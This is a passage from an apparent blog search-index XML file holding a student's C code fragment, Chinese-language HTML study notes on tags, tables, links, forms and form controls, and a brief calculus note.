&#39;0&#39;);            &#125;            else &#123;                int index = 0;                int j = 0;                for (j = 0; j &lt; len; j++) &#123;                    if(s[j] == &#39;;&#39;) &#123;                        index = j;                    &#125;                &#125;                 if (index == 2) &#123;                    x = int(s[len - 4] - &#39;0&#39;);                    y = int(s[len - 2] - &#39;0&#39;) * 10 + int(s[len - 1] - &#39;0&#39;);                &#125;                else &#123;                    x = int(s[len - 4] - &#39;0&#39;) * 10 + int(s[len - 3] - &#39;0&#39;);                    y = int(s[len - 1] - &#39;0&#39;);                &#125;            &#125;            a[n - y][x - 1] = &#39;#&#39;;        &#125;        else &#123;            int len = strlen(s);            if(len == 5) &#123;                x = int(s[len - 5] - &#39;0&#39;) * 10 + int(s[len - 4] - &#39;0&#39;);                y = int(s[len - 2] - &#39;0&#39;) * 10 + int(s[len - 1] - &#39;0&#39;);            &#125;            else if(len == 3) &#123;                x = int(s[len - 3] - &#39;0&#39;);                y = int(s[len - 1] - &#39;0&#39;);            &#125;            else &#123;                int index = 0;                int j = 0;                for (j = 0; j &lt; len; j++) &#123;                    if(s[j] == &#39;/&#39;) &#123;                        index = j;                    &#125;                &#125;                 if (index == 2) &#123;                    x = int(s[len - 4] - &#39;0&#39;);                    y = int(s[len - 2] - &#39;0&#39;) * 10 + int(s[len - 1] - &#39;0&#39;);                &#125;                else &#123;                    x = int(s[len - 4] - &#39;0&#39;) * 10 + int(s[len - 3] - &#39;0&#39;);                    y = int(s[len - 1] - &#39;0&#39;);                &#125;            &#125;            a[n - y][x - 1] = &#39;#&#39;;          &#125;    &#125;    for (i = 0; i &lt; n; i++)&#123;        for (j = 0; j &lt; n; j++)&#123;            printf(&quot;%c&quot;, a[i][j]);        &#125;        printf(&quot;\n&quot;);    &#125;    return 0; &#125; </code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>html学习笔记</title>
      <link href="/2023/03/03/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/03/03/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="第一步：安装好要用的编辑器"><a href="#第一步：安装好要用的编辑器" class="headerlink" title="第一步：安装好要用的编辑器"></a>第一步：安装好要用的编辑器</h1><p>我这里用的是Sublime Text</p><p>我自己看的学习视频 <a href="https://www.bilibili.com/video/BV11t411K74Q/?spm_id_from=333.1007.top_right_bar_window_history.content.click&vd_source=3ae03810e5d4ba6e6b93c5edd6c76912">HTML学习视频</a>。</p><h1 id="第二步：新建HTML文件"><a href="#第二步：新建HTML文件" class="headerlink" title="第二步：新建HTML文件"></a>第二步：新建HTML文件</h1><p><em>在用Sublime Text编写html文件时会自动补全.</em></p><h2 id="我的第一个HTML"><a href="#我的第一个HTML" class="headerlink" title="我的第一个HTML"></a>我的第一个HTML</h2><pre><code class="html">&lt;!--    1、这是HTML的注释    2、支持多行注释    3、不区分大小写，语法松散不严格    4、但最好还是按结构写--&gt;&lt;!doctype html&gt; &lt;!--加上这句话就是H5，去掉则是H4.0--&gt;&lt;!--根--&gt;&lt;html&gt;     &lt;!--头部--&gt;   &lt;!--注意缩进--&gt;    &lt;head&gt;        &lt;title&gt;网页的标题&lt;/title&gt; &lt;!--显示在标签页一栏--&gt;    &lt;/head&gt;    &lt;body&gt; &lt;!--主体--&gt;        网页的主体内容,和老杜学习HTML    &lt;/body&gt;&lt;/html&gt; &lt;!--大小写无所谓--&gt;</code></pre><p><a href="https://postimg.cc/hhCXWfC8"><img src="https://i.postimg.cc/7Y40zz0R/1.png" alt="1.png"></a></p><h2 id="基本标签"><a href="#基本标签" class="headerlink" title="基本标签"></a>基本标签</h2><pre><code class="HTML">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;utf-8&quot;&gt; &lt;!--&lt;mata&gt;标签永远位于head元素内部，这里加上                                    charset属性是为了规定 HTML 文档的字符编码。--&gt;        &lt;!--name属性中的viewport表示页面视图的属性下面设置是为了让网页的宽度自动适应，initial-scale:控制页面最初加载时的在在idealviewport下缩放等级，通常设为1，可以是小数--&gt;        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;        &lt;title&gt;HTML基本标签&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;!--段落标记--&gt;        &lt;p&gt;《三国演义》是罗贯中在有关三国故事的宋元话本、戏曲和轶事传闻的基础上，依据晋代陈寿所著的《三国志》以及南朝宋人裴松之为《三国志》所作的注，所进行的加工再创作。&lt;/p&gt;&lt;p&gt;该作品成书后有嘉靖壬午本等多个版本传于世，到了明末清初，毛宗岗对《三国演义》整顿回目、修正文辞、改换诗文，该版本也成为诸多版本中水平最高、流传最广的版本。&lt;/p&gt;        &lt;!--标题字,是HTML的预留字，和word中的标题字一样--&gt;        &lt;h1&gt;标题字&lt;/h1&gt;        &lt;h2&gt;标题字&lt;/h2&gt;        &lt;h3&gt;标题字&lt;/h3&gt;        &lt;h4&gt;标题字&lt;/h4&gt;        &lt;h5&gt;标题字&lt;/h5&gt;        &lt;h6&gt;标题字&lt;/h6&gt;        &lt;!--最多六个--&gt;        &lt;!--换行--&gt;&lt;!--&lt;br&gt;是独目标记--&gt;        hello         world!        hello&lt;br&gt; world1        &lt;！--横线(独目)--&gt;        &lt;hr&gt;        &lt;!--color和width都是hr标签的属性--&gt;        &lt;hr color=&quot;red&quot; width=&quot;50%&quot;&gt;&lt;!--单双引号没有要求但一定要写--&gt;        &lt;!--预留格式(否则都在一条直线上)--&gt;        &lt;pre&gt;        for(int i = 0; i &lt; 10; i++)&#123;            printf(&quot;NB&quot;);        &#125;        &lt;/pre&gt;        &lt;del&gt;删除字&lt;/del&gt;&lt;br&gt;        &lt;ins&gt;插入字&lt;/ins&gt;&lt;br&gt;        &lt;b&gt;粗体字&lt;/b&gt;&lt;br&gt;        &lt;i&gt;斜体字&lt;/i&gt;&lt;br&gt;        &lt;!--10的平方--&gt;        10&lt;sup&gt;2&lt;/sup&gt;        &lt;!--角标--&gt;        10&lt;sub&gt;m&lt;/sub&gt;&lt;br&gt;        &lt;!--字体标签--&gt;        &lt;font color=&quot;red&quot; size=&quot;59&quot;&gt;字体标签&lt;/font&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><a href="https://postimg.cc/14zzHy98"><img src="https://i.postimg.cc/VsqbzNpW/2.png" alt="2.png"></a></p><h2 id="实体符号"><a href="#实体符号" class="headerlink" title="实体符号"></a>实体符号</h2><pre><code class="HTML">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;utf-8&quot;&gt;        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;        &lt;title&gt;实体符号&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;!--大于号和小于号可能和标签有冲突--&gt;        &lt;!--b&lt;a&gt;c，而&lt;a&gt;s是链接--&gt;        b&amp;lt;a&amp;gt;c&lt;br&gt;        &lt;!--实体符号特点是：以&amp;开始，以;结束。&amp;lt;小于号,&amp;gt;大于号--&gt;        &lt;!--加空格--&gt;        avc    def&lt;br&gt;        avc&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;def            &lt;/body&gt;&lt;/html&gt;</code></pre><p><a href="https://postimg.cc/hXRgHnqb"><img src="https://i.postimg.cc/HkVx8WZK/3.png" alt="3.png"></a></p><h2 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h2><pre><code class="HTML">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;utf-8&quot;&gt;        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;        &lt;title&gt;表格&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;!--            borde=&quot;lpx&quot;设置表格的边框为1像素宽度。        --&gt;            &lt;br&gt;&lt;br&gt;&lt;!--让表格往下走--&gt;            &lt;center&gt;&lt;h1&gt;列表&lt;/h1&gt;&lt;/center&gt;            &lt;hr&gt;        &lt;!--表格先行(tr)后列(td)--&gt;        &lt;table align=&quot;center&quot; border=&quot;1px&quot; width=&quot;50%&quot; height=&quot;150px&quot;&gt;&lt;!--百分比设置可缩放--&gt;            &lt;!--第一行--&gt;            &lt;!--align对齐方式--&gt;            &lt;tr align=&quot;center&quot;&gt;                &lt;!--三列--&gt;                &lt;td&gt;a&lt;/td&gt;                &lt;td&gt;b&lt;/td&gt;                &lt;td&gt;c&lt;/td&gt;            &lt;/tr&gt;            &lt;!--第二行--&gt;            &lt;tr&gt;                &lt;td&gt;d&lt;/td&gt;                &lt;td align=&quot;center&quot;&gt;e&lt;/td&gt;                &lt;td&gt;f&lt;/td&gt;            &lt;/tr&gt;            &lt;!--第三行--&gt;            &lt;tr&gt;                &lt;td&gt;x&lt;/td&gt;                &lt;td&gt;y&lt;/td&gt;                &lt;td&gt;z&lt;/td&gt;            &lt;/tr&gt;        &lt;/table&gt;        &lt;br&gt;&lt;br&gt;&lt;br&gt;        &lt;!--单元格合并,以及th标签--&gt;        &lt;!--注意事项            1、row合并的时候，删除下面的单元格            2、col合并的时候,对删除哪一个没有要求        --&gt;        &lt;table border=&quot;1px&quot; width=&quot;50%&quot;&gt;            &lt;tr&gt;                &lt;!--也是单元格标签，比&lt;td&gt;多的是居中加粗--&gt;                &lt;th&gt;员工编号&lt;/th&gt;                &lt;th&gt;员工薪资&lt;/th&gt;                &lt;th&gt;部门名称&lt;/th&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;a&lt;/td&gt;                &lt;td&gt;b&lt;/td&gt;                &lt;td&gt;c&lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;d&lt;/td&gt;                &lt;td&gt;e&lt;/td&gt;                &lt;td rowspan=&quot;2&quot;&gt;f&lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td colspan=&quot;2&quot;&gt;g&lt;/td&gt;                &lt;!--                    &lt;td&gt;h&lt;/td&gt;                --&gt;                &lt;!--                    &lt;td&gt;i&lt;/td&gt;                --&gt;            &lt;/tr&gt;        &lt;/table&gt;        &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;        &lt;!--thead、tbody、tfoot 在table中不是必须的，但便于后期的js代码编写--&gt;        &lt;table align=&quot;center&quot; border=&quot;1px&quot; width=&quot;50%&quot;&gt;            &lt;thead&gt; &lt;!--头--&gt;                &lt;tr&gt;                    &lt;th&gt;员工编号&lt;/th&gt;                    &lt;th&gt;员工薪资&lt;/th&gt;                    &lt;th&gt;部门名称&lt;/th&gt;                    &lt;th&gt;ex1&lt;/th&gt;                &lt;/tr&gt;                &lt;tr&gt;                    &lt;th&gt;ex1&lt;/th&gt;                &lt;/tr&gt;            &lt;/thead&gt;            &lt;tbody&gt;&lt;!--体--&gt;                &lt;tr&gt;                    &lt;td&gt;a&lt;/td&gt;                    &lt;td&gt;b&lt;/td&gt;                    &lt;td&gt;c&lt;/td&gt;                    &lt;td&gt;ex2&lt;/td&gt;                &lt;/tr&gt;            &lt;/tbody&gt;&lt;!--底--&gt;            &lt;tfoot&gt;                &lt;tr&gt;                    &lt;td&gt;d&lt;/td&gt;                    &lt;td&gt;e&lt;/td&gt;                    &lt;td&gt;f&lt;/td&gt;                    &lt;td&gt;ex3&lt;/td&gt;                &lt;/tr&gt;                &lt;tr&gt;                    &lt;td&gt;ex3&lt;/td&gt;                &lt;/tr&gt;            &lt;/tfoot&gt;        &lt;/table&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><a href="https://postimg.cc/z3LrvvzF"><img src="https://i.postimg.cc/qBwMm6WS/4.png" alt="4.png"></a></p><h2 id="背景色背景图和图片"><a href="#背景色背景图和图片" class="headerlink" title="背景色背景图和图片"></a>背景色背景图和图片</h2><pre><code class="HTML">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;utf-8&quot;&gt; &lt;!--告诉浏览器以什么字符集打开当前页面                                    并不是设置当前页面的字符编码方式--&gt;        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;        &lt;title&gt;背景颜色和背景图片&lt;/title&gt;    &lt;/head&gt;    &lt;body bgcolor=&quot;red&quot; background=&quot;E:\壁纸\测试.png&quot;&gt;        &lt;!--背景色位于背景图片下层--&gt;        &lt;img src=&quot;E:\壁纸\b.png&quot; width=&quot;100px&quot; title=&quot;帕瓦&quot; alt=&quot;图片找不到了！&quot; /&gt;&lt;!--写成&lt;img src=&quot;..&quot; &gt;&lt;/img&gt;也可以&gt;        只设置宽度是高度会随着变(等比例)，只设置高度可能不管用            img标签就是图片标签            src属性是图片的路劲            title设置的时鼠标悬停时显示的信息            alt是用来设置图片加载失败时显示的信息        --&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://s2.loli.net/2023/03/04/RVIahqstznSy4uJ.png" alt="1.png"></p><h2 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h2><pre><code class="HTML">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;utf-8&quot;&gt;        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;        &lt;title&gt;超链接，热链接&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;a href=&quot;https://youzipii.github.io&quot;&gt;博客&lt;/a&gt;&lt;!--文字超链接--&gt;        &lt;br&gt;&lt;br&gt;        &lt;!--            href:hot references 热引用            href后面一定是一个资源的地址            也可以是本地的一个路径        --&gt;        &lt;a href=&quot;file:///C:/Users/yxz/Desktop/%E8%83%8C%E6%99%AF%E9%A2%9C%E8%89%B2%E8%83%8C%E6%99%AF%E5%9B%BE%E7%89%87.html&quot;&gt;超链接 &lt;/a&gt;        &lt;!--超链接的特点            下划线            鼠标停留时会显示小手            点击超链接后能跳转页面            中间不一定要是文字，图片也可以        --&gt;        &lt;a href=&quot;https://youzipii.github.io/&quot;&gt;&lt;img src=&quot;E:\壁纸\b.png&quot; width=&quot;100px&quot;&gt; &lt;/a&gt;&lt;!--图片超链接--&gt;        &lt;br&gt;        &lt;a href=&quot;https://youzipii.github.io&quot; target=&quot;_blank&quot;&gt;博客&lt;/a&gt;        &lt;!--_blank是在新标签页中打开如果是self则是在本标签中打开            _self当前窗口            _top顶级窗口            _parents父窗口        --&gt;    &lt;/body&gt;&lt;/html&gt;&lt;!--超链接的作用    通过超链接可以从浏览器向服务器发送请求    浏览器向服务器发送数据(请求：request)    服务器向浏览器发送数据(响应:reponse)    B/S 结构的系统：每一个请求都会对应一个响应    B——请求——》S    S——响应——》B    用户点击超链接和直接书入URL有什么区别?    本质上没有，但超链接更方便--&gt;</code></pre><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><pre><code class="HTML">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;utf-8&quot;&gt;        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;        &lt;title&gt;列表&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;!--有序列表--&gt;        &lt;ol type=&quot;a&quot;&gt; &lt;!-- 1 数字 A 大写字母 a 小写字母 i 希腊字母--&gt;            &lt;li&gt;水果                &lt;ol&gt;                    &lt;li&gt;apple1&lt;/li&gt;                    &lt;li&gt;apple2&lt;/li&gt;                    &lt;li&gt;apple3&lt;/li&gt;                &lt;/ol&gt;            &lt;/li&gt;            &lt;li&gt;蔬菜&lt;/li&gt;            &lt;li&gt;甜点&lt;/li&gt;        &lt;/ol&gt;        &lt;!--无序列表--&gt;        &lt;ul type=&quot;circle&quot;&gt;&lt;!--circle 圈圈 disc 方块 square点点--&gt;            &lt;li&gt;apple                &lt;ul&gt;                    &lt;li&gt;apple 3&lt;/li&gt;                    &lt;li&gt;apple 2&lt;/li&gt;                    &lt;li&gt;apple 1&lt;/li&gt;                &lt;/ul&gt;            &lt;/li&gt;            &lt;li&gt;banana&lt;/li&gt;            &lt;li&gt;grape&lt;/li&gt;        &lt;/ul&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><h2 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h2><pre><code class="HTML">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;utf-8&quot;&gt;        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;        &lt;title&gt;表单form&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;!--            1、表单有什么用？                收集用户信息                表单展现之后，用户填写表单，点击提交后提交数据给服务器            2、怎么画一个表单呢？                使用form标签            3、一个网页当中可以有多个表单            4、表单最终需要提交数据给服务器。                form标签有一个action属性，这个属性用来指定服务器地址                action属性和超链接的href属性一样，都可以向服务器发送请求（request）        --&gt;        &lt;form action=&quot;http://192.199.177:8080/oa/save&quot;&gt;            &lt;input type=&quot;submit&quot; value=&quot;注册&quot; /&gt;            &lt;input type=&quot;button&quot; value=&quot;设置按钮上得文本&quot; /&gt;            &lt;!--对于按钮来说value用于指定按钮的文本信息--&gt;        &lt;/form&gt;        &lt;!--传给这个机器上8080端口的软件--&gt;        &lt;!--画一个提交(suibmit)按钮可以使用input输入域,type = &quot;input&quot;,此时按钮具有提交表单的能力，空着的是普通按钮，没有提交能力。--&gt;        &lt;!-- 笔记            在用sublime的自动补全时，input标签补全的是type和name 而没有            value            搜索资料name指的是控件的名称,即文本框的名称，而在type 为submit时更改name并不能改变按钮上的字，得改变value得值，            value是指文字域得默认取值，用于定于文本框（中）得默认值            说明submit得默认值是提交.            还有在自动补全时并没有补充/ 但浏览器也能识别不会报错，但写上更规范                        超链接和表单都能向服务器发送请求，但表单可以携带数据            按钮要放到表单标签内部才能有作用            没有name时不会提交的        --&gt;        &lt;form action=&quot;http://www.baidu.com&quot;&gt;            &lt;input type=&quot;text&quot; name=&quot;&quot; /&gt;            &lt;input type=&quot;submit&quot; name=&quot;&quot; value=&quot;百度&quot; /&gt;        &lt;/form&gt;        &lt;br&gt;        &lt;form action=&quot;http:\\localhost:8080/jd/login&quot;&gt;            用户名&lt;input type=&quot;text&quot; name=&quot;&quot; /&gt;&lt;br&gt;            密码&lt;input type=&quot;password&quot; name=&quot;&quot; /&gt;&lt;br&gt;            &lt;input type=&quot;submit&quot; name=&quot;&quot; /&gt;        &lt;/form&gt;        &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;        &lt;!--             表单时以什么格式提交给服务器的？            http://localhost:8080/jd/login?username=abc&amp;pwd=111            格式:action?name=value&amp;name=value&amp;name=value            HTTP协议规定的，必须以这种格式提交给服务器                         重点，表单写了name属性的，一律会提交给服务器。                    name为空好像也不提交，不知道是交了没有                    在测试时并不会多了&amp;            value没有写的时候，value的默认值是空字符串，java代码得到的是 string = &quot;&quot;;        --&gt;        &lt;form action=&quot;http:\\localhost:8080/jd/login&quot;&gt;            &lt;table&gt;                &lt;tr&gt;                    &lt;td&gt;用户名&lt;/td&gt;                    &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot;  /&gt;&lt;/td&gt;                    &lt;!--text类型value由用户写--&gt;                &lt;/tr&gt;                &lt;tr&gt;                    &lt;td&gt;密码&lt;/td&gt;                    &lt;td&gt;&lt;input type=&quot;password&quot; name=&quot;pwd&quot; /&gt;&lt;/td&gt;                &lt;/tr&gt;                &lt;tr&gt;                    &lt;td align=&quot;center&quot; colspan=&quot;2&quot;&gt;                        &lt;input type=&quot;submit&quot; name=&quot;&quot; /&gt;                        &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;                        &lt;input type=&quot;reset&quot; name=&quot;&quot; value=&quot;清空&quot;&gt;                    &lt;/td&gt;                &lt;/tr&gt;        &lt;/table&gt;    &lt;/form&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><h2 id="用户注册表单"><a href="#用户注册表单" class="headerlink" title="用户注册表单"></a>用户注册表单</h2><pre><code class="HTML">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;utf-8&quot;&gt;        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;        &lt;title&gt;用户注册表单&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;!--            用户注册:                用户名                密码                确认密码                性别                兴趣爱好                学历                简介        --&gt;        &lt;form accept=&quot;http://localhost:8080/jd/register&quot; method=&quot;post&quot;&gt;            &lt;!--                form表单method属性                gets:用户提交的信息会显示在地址栏上                post:用户名提交的信息不会显示在浏览器地址栏上                当用户提交的信息含有敏感信息时建议用post方式提交                默认时gets方式，只有methon指定时post时才是post请求                两种方式提交的数据格式还是一样的            --&gt;            用户名            &lt;input type=&quot;text&quot; name=&quot;username&quot; /&gt;            &lt;br&gt;            密码            &lt;input type=&quot;password&quot; name=&quot;userpwd&quot; /&gt;            &lt;br&gt;            确认密码 &lt;!--确认密码不用发到服务器，JavaScript就可以解决--&gt;            &lt;input type=&quot;password&quot; /&gt;            &lt;br&gt;            性别&lt;!--name相同时只能选一个，name不同是可以都选--&gt;            &lt;!--checked 默认选中--&gt;            &lt;input type=&quot;radio&quot; name=&quot;gender&quot; value=&quot;1&quot; checked /&gt;男            &lt;input type=&quot;radio&quot; name=&quot;gender&quot; value=&quot;0&quot; /&gt;女            &lt;!--单选按钮的value必须手动指定--&gt;            &lt;br&gt;            兴趣爱好            &lt;input type=&quot;checkbox&quot; name=&quot;interest&quot; value=&quot;basketball&quot; /&gt;打篮球            &lt;input type=&quot;checkbox&quot; name=&quot;interest&quot; value=&quot;football&quot; checked  /&gt;打足球            &lt;input type=&quot;checkbox&quot; name=&quot;interest&quot; value=&quot;volleyball&quot; /&gt;打排球            &lt;br&gt;            学历            &lt;select name=&quot;grade&quot;&gt;                &lt;option value=&quot;gz&quot;&gt;高中&lt;/option&gt;                &lt;option value=&quot;dz&quot;&gt;大专&lt;/option&gt;                &lt;option value=&quot;bk&quot; selected&gt;本科&lt;/option&gt;&lt;!--默认选中--&gt;                &lt;option value=&quot;ss&quot;&gt;硕士&lt;/option&gt;            &lt;/select&gt;            &lt;br&gt;            简介&lt;!--文本域,没有value属性，填的就是value--&gt;            &lt;textarea rows=&quot;10&quot; cols=&quot;60&quot; name=&quot;introduce&quot;&gt;&lt;/textarea&gt;            &lt;br&gt;            &lt;input type=&quot;submit&quot; value=&quot;注册&quot; /&gt;            &lt;input type=&quot;reset&quot; value=&quot;清空&quot; /&gt;            &lt;br&gt;            &lt;!--username=jackon&amp;userpwd=111&amp;gender=1&amp;interest=football&amp;grade=bk&amp;introduce=111--&gt;        &lt;/form&gt;        &lt;!--超链接也可以提交数据给服务器，但提交的数据时固定的。--&gt;        &lt;!--超链接时gets请求，不是post请求--&gt;        &lt;a href=&quot;http://localhost:8080/jd/register?username=ctl&amp;password=111&quot;&gt;提交&lt;/a&gt;        &lt;!--http://localhost:8080/jd/register?username=ctl&amp;password=111        --&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://s2.loli.net/2023/03/05/MKi9Y1QOwZTHuaJ.png" alt="用户注册表单.png"></p><h2 id="一些控件"><a href="#一些控件" class="headerlink" title="一些控件"></a>一些控件</h2><pre><code class="HTML">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;utf-8&quot;&gt;        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;        &lt;title&gt;一些控件&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;!--下拉列表支持多选--&gt;        &lt;!--multiple支持多选，但要按住CTRL--&gt;        &lt;!--size控制显示的条数--&gt;        &lt;select multiple=&quot;multiple&quot; size=&quot;2&quot;&gt;            &lt;option&gt;福建省&lt;/option&gt;            &lt;option&gt;江西省&lt;/option&gt;            &lt;option&gt;山东省&lt;/option&gt;            &lt;option&gt;海南省&lt;/option&gt;            &lt;option&gt;陕西省&lt;/option&gt;        &lt;/select&gt;        &lt;!--文件上传专用--&gt;        &lt;input type=&quot;file&quot; name=&quot;&quot; /&gt;        &lt;br&gt;        &lt;!--隐藏域hidden 控件--&gt;        &lt;form action=&quot;http://localhost:8080/jd/save&quot; method=&quot;post&quot;&gt;            &lt;!--网页上看不到，但表单提交的时候数据会自动提交给服务器。--&gt;            &lt;!--userid=111&amp;usercode=--&gt;            &lt;input type=&quot;hidden&quot; name=&quot;userid&quot; value=&quot;111&quot; /&gt;            &lt;br&gt;            &lt;input type=&quot;text&quot; name=&quot;userid&quot; value=&quot;111&quot; /&gt;            &lt;br&gt;            用户代码&lt;input type=&quot;text&quot; name=&quot;usercode&quot;  /&gt;            &lt;input type=&quot;submit&quot; name=&quot;&quot; value=&quot;提交&quot; /&gt;        &lt;/form&gt;        &lt;!--readonly和disabled--&gt;        &lt;!--相同点:都是只读不能修改            不同点:readonly可以提交给服务器,disabled数据包不会提交(即使由name属性)        --&gt;        &lt;form action=&quot;http://localhost:8080/jd/save&quot;&gt;            用户代码&lt;input type=&quot;text&quot; name=&quot;usercode&quot; value=&quot;111&quot;readonly /&gt;            &lt;br&gt;             用户姓名&lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;123&quot; disabled /&gt;            &lt;br&gt;            &lt;input type=&quot;submit&quot; value=&quot;提交数据&quot; /&gt;            &lt;br&gt;            &lt;!--usercode=111--&gt;        &lt;!--input控件的maxlength的属性--&gt;        &lt;!--设置文本框中可输入字符的数量--&gt;        &lt;input type=&quot;text&quot; name=&quot;&quot; maxlength=&quot;3&quot; /&gt;        &lt;br&gt;        &lt;/form&gt;        &lt;!--提一提--&gt;        &lt;!--HTML中元素的id属性--&gt;        &lt;!--            1、在HTML文档中，任何元素（节点）都有id属性            2、id属性时该节点的唯一标识，所以在同一个HTML文档中id值不能重复            3、id有什么用?                a.id是为了让我们更方便的获取这个元素                b.JavaScript可以对HTML文档中任意节点进行增删改操作，那么增删改之前需要先拿到这个节点，通常我们通过id来拿节点对象            4、THML文档是一棵树，树上有很多节点，每一个节点有唯一的id              (DOM树)                    --&gt;        &lt;center&gt;&lt;a href=&quot;https://smms.app/image/KYOs57H8RPvpTUaS&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://s2.loli.net/2023/03/05/KYO57H8RPvpTUaS.png&quot; &gt;&lt;/a&gt;&lt;/center&gt;        &lt;br&gt;        &lt;center&gt;&lt;font color=&quot;red&quot; size=&quot;50&quot;&gt;DOM树&lt;/font&gt;&lt;/center&gt;        &lt;form id=&quot;myform&quot;&gt;            &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; /&gt;            &lt;input type=&quot;password&quot; id=&quot;userpwd&quot; name=&quot;userpwd&quot; /&gt;            &lt;!--id就是节点的身份证号，不能重复.--&gt;            &lt;!--表单提交数据的时候只和name有关和id无关--&gt;        &lt;/form&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://s2.loli.net/2023/03/05/j4AhuTDvOSVIlbQ.png" alt="122.png"></p><h2 id="div和span"><a href="#div和span" class="headerlink" title="div和span"></a>div和span</h2><pre><code class="HTML">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;utf-8&quot;&gt;        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;        &lt;title&gt;HTML中的div和span&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;!--            1、div和span有什么用？？                div和span都可以称为“图层”                div和span时可以定位的，只要顶下dic的左上角的x轴和y轴坐标即可            2、图层有什么用？                保证页面可以灵活的布局            3、最早的网页使用table布局，但是table不灵活，太死板            现代网页开发div布局使用最多，几乎很少使用table进行布局            4、div和span的区别？            默认情况下div会占用一行，span不会占用一行        --&gt;        &lt;div id=&quot;div1&quot;&gt;我是一个div&lt;/div&gt;        &lt;div id=&quot;div2&quot;&gt;我是一个div&lt;/div&gt;        &lt;span id=&quot;span1&quot;&gt;我是一个span标签&lt;/span&gt;        &lt;span id=&quot;span2&quot;&gt;我是一个span标签&lt;/span&gt;        &lt;div id=&quot;div3&quot;&gt;            &lt;div&gt;                &lt;div&gt;test&lt;/div&gt;            &lt;/div&gt;        &lt;/div&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://s2.loli.net/2023/03/05/GDiRjskFudHpvTM.png" alt="11.png"></p><h1 id="暂停于此"><a href="#暂停于此" class="headerlink" title="暂停于此"></a>暂停于此</h1>]]></content>
      
      
      
        <tags>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一道积分笔记</title>
      <link href="/2022/10/16/%E4%B8%80%E9%81%93%E7%A7%AF%E5%88%86%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/10/16/%E4%B8%80%E9%81%93%E7%A7%AF%E5%88%86%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p><img src="https://s2.loli.net/2022/10/16/oQcA3TLsHYMVnkb.png" alt="MommyTalk1665933979433.png"><br><strong>忘记加绝对值</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> 奇思妙想 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
